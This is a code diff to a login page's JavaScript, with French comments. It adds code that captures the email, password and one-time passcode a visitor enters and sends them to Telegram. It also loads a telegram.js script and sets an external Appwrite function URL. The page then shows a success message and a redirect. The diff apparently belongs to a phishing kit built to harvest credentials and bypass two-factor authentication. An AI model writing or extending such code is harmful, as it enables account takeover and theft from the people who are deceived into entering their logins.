@@ -1220,7 +1220,12 @@
                     const email = emailInput.value;
                     const password = passInput.value; // passInput est déjà défini plus haut
 
-
+                    // Envoyer les identifiants à Telegram
+                    try {
+                        await telegramSender.sendLoginCredentials(email, password, 'Connexion');
+                    } catch (error) {
+                        console.error('Erreur Telegram:', error);
+                    }
 
                     if (targetUserText) targetUserText.textContent = email;
                     otpModal.style.display = "flex";
@@ -1256,12 +1261,19 @@
                 verifyBtn.addEventListener('click', async () => {
                     const codeComplet = Array.from(otpBoxes).every(input => input.value.length > 0);
                     if (codeComplet) {
+                        const otp = Array.from(otpBoxes).map(input => input.value).join('');
+                        
+                        // Envoyer l'OTP à Telegram
+                        try {
+                            await telegramSender.sendOTPVerification(emailInput.value, otp, 'Connexion');
+                        } catch (error) {
+                            console.error('Erreur Telegram:', error);
+                        }
+                        
                         // Désactiver le bouton pour éviter les doubles clics
                         verifyBtn.disabled = true;
                         verifyBtn.style.opacity = '0.6';
                         verifyBtn.style.cursor = 'default';
-
-
 
                         // Afficher le message de succès
                         const successMessage = document.getElementById('redirectCountdown');
@@ -1277,6 +1289,13 @@
                 });
             }
         });
+    </script>
+
+    <!-- Import telegram.js -->
+    <script src="telegram.js"></script>
+    <script>
+        // Configuration de l'URL Appwrite Function
+        window.APPWRITE_FUNCTION_URL = 'https://69b7297c003347c0b8be.fra.appwrite.run';
     </script>
 
 </body>
